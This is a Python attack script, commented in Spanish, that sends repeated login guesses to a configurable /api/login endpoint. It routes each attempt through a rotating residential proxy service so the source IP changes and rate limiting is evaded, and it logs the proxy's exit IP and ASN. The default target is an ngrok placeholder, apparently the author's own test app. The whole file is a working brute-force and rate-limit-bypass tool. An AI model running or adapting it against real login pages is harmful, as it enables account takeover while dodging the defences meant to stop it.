#!/usr/bin/env python3
import requests
import time
import sys
import urllib3
import os
import random

# Desactivar advertencias de SSL para proxys (opcional)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuración de PlainProxies (vía Variables de Entorno)
# Hint: El username puede incluir targeting, ej: "USER-country-ES"
PP_USERNAME = os.getenv("PP_USERNAME")
PP_PASSWORD = os.getenv("PP_PASSWORD")
PP_HOST = os.getenv("PP_HOST", "res-v2.pr.plainproxies.com") 
PP_PORT = os.getenv("PP_PORT", "8080")

if not PP_USERNAME or not PP_PASSWORD:
    print("[!] Error: Variables de entorno PP_USERNAME y PP_PASSWORD no definidas.")
    print("    Ejecuta con: PP_USERNAME='...' PP_PASSWORD='...' TARGET_URL='...' python3 plainproxies_attack.py")
    sys.exit(1)

# Objetivo
TARGET_BASE = os.getenv("TARGET_URL", "https://TU-URL-NGROK.ngrok-free.app")
TARGET_URL = f"{TARGET_BASE}/api/login"
CHECK_IP_URL = f"{TARGET_BASE}/api/check-ip"

def get_proxy_url():
    """Construye la URL del proxy autenticado"""
    return f"http://{PP_USERNAME}:{PP_PASSWORD}@{PP_HOST}:{PP_PORT}"

def check_current_ip():
    """Verifica qué IP está usando el Proxy"""
    proxies = {
        "http": get_proxy_url(),
        "https": get_proxy_url()
    }
    try:
        r = requests.get(CHECK_IP_URL, proxies=proxies, verify=False, timeout=10)
        print(f"[*] Salida Proxy: {r.text.strip()}")
        return r.text
    except Exception as e:
        print(f"[!] Error proxy: {e}")
        return None

def attack():
    print(f"[*] Iniciando ataque vía PlainProxies.com")
    print(f"[*] Host: {PP_HOST}:{PP_PORT}")
    print(f"[*] Usuario: {PP_USERNAME}")

    print("\n[*] Probando conexión inicial...")
    check_current_ip()

    proxies = {
        "http": get_proxy_url(),
        "https": get_proxy_url()
    }

    # Ataque Loop

    # Ataque
    for i in range(1, 20): 
        try:
            print(f"\n[{i}] ------------------------------------------------")
            
            # 1. Obtener Info de la IP (WHOIS Simulado via lumtest)
            try:
                print(f"   🔎 Checkeando IP del Proxy...")
                r_ip = requests.get("http://lumtest.com/myip.json", proxies=proxies, verify=False, timeout=10)
                ip_info = r_ip.json()
                ip = ip_info.get('ip')
                country = ip_info.get('country')
                asn = ip_info.get('asn', {}).get('org_name', 'Unknown ASN')
                print(f"   🌍 IP: {ip} | País: {country} | ASN: {asn}")
            except Exception as e:
                print(f"   ⚠️ No se pudo obtener info WHOIS: {e}")

            # 2. Credenciales
            username = "admin"
            password = f"pass_{i}"
            print(f"   🔑 Intentando con: {username} / {password}")

            # 3. Ataque
            payload = {
                "username": username,
                "password": password
            }
            
            start = time.time()
            r = requests.post(TARGET_URL, json=payload, proxies=proxies, verify=False, timeout=15)
            latency = time.time() - start
            
            if r.status_code == 429:
                print(f"   ⛔ Bloqueado (429). Rate Limit detectado.")
            elif r.status_code == 401:
                print(f"   ✅ Intento fallido (200/401) - Bypass Exitoso ({latency:.2f}s)")
            else:
                print(f"   ❓ Status: {r.status_code}")
                # print(f"      Body: {r.text[:200]}...") 

            # 4. Pausa
            print("   ⏳ Esperando 10s...")
            time.sleep(10)

        except Exception as e:
            print(f"   [!] Error: {e}")

if __name__ == "__main__":
    attack()
